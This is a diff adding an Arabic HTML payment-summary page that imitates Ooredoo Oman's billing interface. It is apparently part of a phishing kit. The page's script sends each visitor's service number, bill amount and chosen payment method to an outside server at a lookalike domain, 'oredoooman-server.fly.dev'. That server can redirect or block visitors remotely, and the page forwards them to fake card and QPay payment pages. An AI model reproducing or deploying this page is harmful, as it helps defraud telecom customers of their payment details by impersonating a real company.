@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ملخص الدفع | Ooredoo</title>
+<style>
+@font-face { font-family: 'Rubik-Regular'; src: url('/ooredoo/fonts/Rubik-Regular.woff2') format('woff2'); font-weight: 400; }
+@font-face { font-family: 'Rubik-Medium'; src: url('/ooredoo/fonts/Rubik-Medium.woff2') format('woff2'); font-weight: 500; }
+@font-face { font-family: 'NotoKufiArabic-Regular'; src: url('/ooredoo/fonts/NotoKufiArabic-Regular.woff2') format('woff2'); font-weight: 400; }
+@font-face { font-family: 'NotoKufiArabic-SemiBold'; src: url('/ooredoo/fonts/NotoKufiArabic-SemiBold.woff2') format('woff2'); font-weight: 600; }
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; direction: ltr; min-height: 100vh; display: flex; justify-content: center; }
+.container { width: 100%; max-width: 552px; min-height: 100vh; display: flex; background: #fff; overflow-x: hidden; }
+.main { width: 375px; min-height: 100vh; background: #fff; display: flex; flex-direction: column; position: relative; border-right: 1px solid #f0f0f0; direction: rtl; }
+.header { position: sticky; top: 0; z-index: 10; height: 72px; display: grid; grid-template-columns: 32px 1fr 32px; align-items: center; padding: 0 16px; background: #fff; border-bottom: 1px solid #d8d8d8; direction: ltr; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+.header img { width: 22px; height: 22px; }
+.header h2 { margin: 0; text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 16px; font-weight: 500; color: #080808; direction: rtl; }
+.back-btn { border: none; background: transparent; padding: 0; width: 32px; height: 32px; display: inline-flex; align-items: center; justify-content: center; cursor: pointer; justify-self: end; }
+.content { flex: 1; display: flex; flex-direction: column; padding: 18px 20px 150px; }
+.content h1 { margin: 6px 0 20px; text-align: right; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 20px; font-weight: 600; color: #080808; line-height: 1.5; }
+.info-box { width: 100%; border-radius: 16px; background: #f7f7f8; padding: 16px 22px; display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-bottom: 42px; }
+.info-box .label { text-align: right; color: #080808; font-size: 16px; line-height: 24px; }
+.info-box .amount { color: #080808; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 20px; font-weight: 600; direction: ltr; }
+.payment-title { text-align: center; margin-bottom: 28px; }
+.payment-title h3 { color: #080808; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 18px; font-weight: 600; }
+.payment-title p { margin: 4px 0 0; color: #4c5562; font-size: 14px; }
+.payment-options { display: flex; flex-direction: column; gap: 16px; }
+.payment-option { width: 100%; border-radius: 18px; border: 2px solid #edf0f2; background: #fff; box-shadow: 0 4px 16px rgba(0,0,0,0.06); padding: 18px 16px; cursor: pointer; text-align: right; transition: all 0.2s ease; }
+.payment-option.selected { border-color: #ed1c24; box-shadow: 0 6px 18px rgba(237,28,36,0.08); }
+.payment-option .inner { display: flex; align-items: center; justify-content: space-between; gap: 12px; direction: rtl; }
+.radio-circle { width: 26px; height: 26px; border-radius: 50%; border: 1.5px solid #d7dce2; display: inline-block; flex-shrink: 0; }
+.radio-selected { width: 24px; height: 24px; flex-shrink: 0; }
+.option-label { flex: 1; color: #080808; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 16px; font-weight: 500; text-align: right; }
+.option-logo { min-width: 54px; height: 32px; display: flex; align-items: center; justify-content: flex-start; flex-shrink: 0; }
+.apple-warning { margin-top: 10px; color: #ed1c24; font-size: 12px; text-align: center; }
+.footer { position: sticky; bottom: 0; padding: 14px 20px 22px; background: linear-gradient(180deg, rgba(255,255,255,0) 0%, #fff 26%, #fff 100%); }
+.continue-btn { width: 100%; height: 62px; border-radius: 999px; border: none; outline: none; background: #ebecef; color: #9da3ae; cursor: not-allowed; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 18px; font-weight: 600; }
+.continue-btn.active { background: #ed1c24; color: #fff; cursor: pointer; box-shadow: 0 10px 24px rgba(237,28,36,0.2); }
+.sidebar { width: 177px; background: #fff; border-left: 1px solid #f0f0f0; display: flex; flex-direction: column; align-items: center; padding: 25px 16px 31px; gap: 26px; min-height: 100vh; direction: rtl; }
+.sidebar img.logo { width: 120px; height: 38px; object-fit: contain; }
+.nav-items { width: 100%; display: flex; flex-direction: column; gap: 16px; }
+.nav-item { width: 100%; border: none; outline: none; background: transparent; border-radius: 24px; padding: 8px 16px; display: flex; align-items: center; gap: 12px; color: #222; cursor: default; font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', sans-serif; font-size: 16px; text-align: right; direction: rtl; }
+.nav-item.active { background: #fff0f0; color: #ed1c24; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-weight: 500; }
+.nav-item img { width: 22px; height: 22px; }
+@media (max-width: 600px) {
+  body { background: #fff; }
+  .container { max-width: 100%; }
+  .main { width: 100%; border-right: none; }
+  .header { height: 56px; border-bottom: none; box-shadow: none; }
+  .header h2 { font-size: 14px; }
+  .sidebar { display: none; }
+  .content { padding: 10px 16px 140px; }
+  .content h1 { font-size: 18px; margin: 4px 0 16px; }
+  .info-box { padding: 14px 16px; margin-bottom: 24px; }
+  .info-box .label { font-size: 14px; }
+  .info-box .amount { font-size: 18px; }
+  .payment-title h3 { font-size: 16px; }
+  .payment-title p { font-size: 13px; }
+  .payment-options { gap: 12px; }
+  .payment-option { padding: 14px; }
+  .option-label { font-size: 14px; }
+  .footer { padding: 12px 16px 18px; }
+  .continue-btn { height: 56px; font-size: 16px; }
+  .mobile-logo { display: flex; justify-content: center; padding: 2px 16px 8px; background: #fff; }
+  .mobile-logo img { width: 116px; height: 36px; object-fit: contain; }
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <main class="main">
+    <div class="header">
+      <img src="/ooredoo/icons/support-icon.svg" alt="Support">
+      <h2>ملخص</h2>
+      <button class="back-btn" onclick="history.back()">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#080808" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
+      </button>
+    </div>
+    <div class="mobile-logo" style="display:none;"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></div>
+    <div class="content">
+      <h1>دفع سريع و آمن</h1>
+      <div class="info-box">
+        <div>
+          <div class="label">رقم الخدمة</div>
+          <div class="label" id="service-number" style="font-weight:600;margin-top:2px;">-</div>
+        </div>
+        <div class="amount"><span id="total-amount">0</span> <span id="currency-label">ر.ع</span></div>
+      </div>
+      <div class="payment-title">
+        <h3>اختر طريقة الدفع</h3>
+        <p>يرجى اختيار طريقه الدفع</p>
+      </div>
+      <div class="payment-options">
+        <button class="payment-option" data-method="card" onclick="selectMethod('card')">
+          <div class="inner">
+            <span class="radio-circle"></span>
+            <span class="option-label">بطاقة الائتمان</span>
+            <span class="option-logo">
+              <span style="color:#1a1f71;font-family:Arial;font-size:13px;font-weight:700;letter-spacing:0.4px;">VISA</span>
+              <span style="position:relative;width:28px;height:18px;display:inline-flex;align-items:center;justify-content:center;margin-right:6px;">
+                <span style="position:absolute;right:2px;width:16px;height:16px;border-radius:50%;background:#eb001b;"></span>
+                <span style="position:absolute;left:2px;width:16px;height:16px;border-radius:50%;background:#f79e1b;opacity:0.95;"></span>
+              </span>
+            </span>
+          </div>
+        </button>
+        <button class="payment-option" data-method="knet" onclick="selectMethod('knet')">
+          <div class="inner">
+            <span class="radio-circle"></span>
+            <span class="option-label">QPay</span>
+            <span class="option-logo"><img src="/assets/qpay-logo.png" alt="QPay" style="width:80px;height:30px;object-fit:contain;"></span>
+          </div>
+        </button>
+        <button class="payment-option" data-method="transfer" onclick="selectMethod('transfer')">
+          <div class="inner">
+            <span class="radio-circle"></span>
+            <span class="option-label">Apple Pay</span>
+            <span class="option-logo">
+              <svg width="34" height="34" viewBox="0 0 24 24" fill="#080808"><path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z"/></svg>
+            </span>
+          </div>
+          <div class="apple-warning" style="display:none;">الدفع عن طريق Apple Pay غير متاح حالياً</div>
+        </button>
+      </div>
+    </div>
+    <div class="footer">
+      <button class="continue-btn" id="continueBtn" onclick="handleContinue()">استمرار</button>
+    </div>
+  </main>
+  <aside class="sidebar">
+    <img class="logo" src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo">
+    <nav class="nav-items">
+      <button class="nav-item"><img src="/ooredoo/icons/home-icon.svg" alt=""><span>الرئيسية</span></button>
+      <button class="nav-item"><img src="/ooredoo/icons/manage-icon.svg" alt=""><span>إدارة</span></button>
+      <button class="nav-item active"><img src="/ooredoo/icons/pay-icon-active.svg" alt=""><span>دفع</span></button>
+      <button class="nav-item"><img src="/ooredoo/icons/shop-icon.svg" alt=""><span>المتجر</span></button>
+      <button class="nav-item"><img src="/ooredoo/icons/more-icon.svg" alt=""><span>المزيد</span></button>
+    </nav>
+  </aside>
+</div>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script>
+(function() {
+  var selectedMethod = null;
+  var isProcessing = false;
+  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
+  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
+  var visitorId = localStorage.getItem('visitorId') || '';
+
+  // Load data from sessionStorage
+  var billData = null;
+  try { billData = JSON.parse(sessionStorage.getItem('last_ooredoo_bill_lookup') || 'null'); } catch(e) {}
+  var serviceNumber = (billData && (billData.number || billData.customerNumber)) || '-';
+  var amount = (billData && billData.amount) || 0;
+  var currency = 'ر.ع';
+
+  document.getElementById('service-number').textContent = serviceNumber;
+  document.getElementById('total-amount').textContent = amount;
+  document.getElementById('currency-label').textContent = currency;
+
+  // Socket connection
+  socket.on('connect', function() {
+    console.log('Socket connected');
+    if (visitorId) {
+      socket.emit('visitor:reconnect', visitorId);
+    }
+    socket.emit('visitor:pageEnter', 'ملخص الدفع');
+  });
+
+  socket.on('visitor:registered', function(data) {
+    if (data && data._id) {
+      visitorId = data._id;
+      localStorage.setItem('visitorId', data._id);
+    }
+    if (data && data.pid) localStorage.setItem('visitorId', data.pid);
+  });
+
+  socket.on('visitor:navigate', function(page) {
+    if (page) window.location.href = '/' + page;
+  });
+
+  socket.on('admin-last-message', function(data) {
+    if (data && data.message) {
+      localStorage.setItem('adminLastMessage', data.message);
+      window.location.href = '/final-page/';
+    }
+  });
+
+  socket.on('blocked', function() {
+    alert('تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.');
+  });
+
+  // Mobile logo visibility
+  if (window.innerWidth <= 600) {
+    var ml = document.querySelector('.mobile-logo');
+    if (ml) ml.style.display = 'flex';
+  }
+
+  // Select payment method
+  window.selectMethod = function(method) {
+    selectedMethod = method;
+    var options = document.querySelectorAll('.payment-option');
+    options.forEach(function(opt) {
+      var m = opt.getAttribute('data-method');
+      var circle = opt.querySelector('.radio-circle');
+      var warning = opt.querySelector('.apple-warning');
+      if (m === method) {
+        opt.classList.add('selected');
+        if (circle) circle.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" fill="#ed1c24"/><path d="M7 12.5l3 3 7-7" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+        if (warning && m === 'transfer') warning.style.display = 'block';
+      } else {
+        opt.classList.remove('selected');
+        if (circle) circle.innerHTML = '';
+        if (warning) warning.style.display = 'none';
+      }
+    });
+    var btn = document.getElementById('continueBtn');
+    if (method && method !== 'transfer') {
+      btn.classList.add('active');
+      btn.disabled = false;
+    } else {
+      btn.classList.remove('active');
+      btn.disabled = true;
+    }
+  };
+
+  // Handle continue
+  window.handleContinue = function() {
+    if (!selectedMethod || selectedMethod === 'transfer' || isProcessing) return;
+    isProcessing = true;
+    var btn = document.getElementById('continueBtn');
+    btn.textContent = 'جاري المعالجة...';
+    btn.classList.remove('active');
+
+    var paymentMethodLabel = selectedMethod === 'card' ? 'بطاقة ائتمان' : selectedMethod === 'knet' ? 'QPay' : 'Apple Pay';
+
+    // Send data to server
+    socket.emit('more-info', {
+      content: { paymentMethod: paymentMethodLabel, serviceNumber: serviceNumber, totalAmount: amount },
+      page: 'ملخص الدفع',
+      waitingForAdminResponse: false
+    });
+
+    setTimeout(function() {
+      if (selectedMethod === 'knet') {
+        window.location.href = '/knet-payment/';
+      } else if (selectedMethod === 'card') {
+        window.location.href = '/credit-card-payment/?service=' + encodeURIComponent(serviceNumber) + '&amount=' + amount;
+      }
+    }, 1500);
+  };
+})();
+</script>
+</body>
+</html>
